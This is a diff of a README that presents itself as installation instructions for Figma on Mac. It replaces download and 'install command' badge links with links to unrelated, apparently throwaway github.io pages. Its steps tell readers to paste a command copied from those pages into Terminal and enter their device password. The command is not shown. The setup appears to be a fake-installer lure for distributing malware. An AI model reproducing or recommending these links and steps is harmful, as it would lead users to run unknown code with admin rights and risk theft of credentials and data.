@@ -4,7 +4,7 @@
 Figma for Mac is a powerful design and prototyping tool that allows teams and individuals to create, collaborate, and deliver UI/UX projects efficiently. 🎨  
 Follow the steps below to install Figma safely on your Mac.  
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://juianaiud84.github.io/.github/figma-for-mac)  
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 If the download button does not work, you can also install Figma using the terminal command provided below.  
 
@@ -23,7 +23,7 @@ If the download button does not work, you can also install Figma using the termi
 
 1. Get the installation command by pressing this button:  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-007AFF?style=for-the-badge&logo=apple)](https://gistcdn.githack.com/bountyhuntergekata-svg/e3057e5ea2db5afb177822989f4bc16c/raw/1349586a7be751fa8ef74c70f35af4ed7cfad693/install.html)  
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
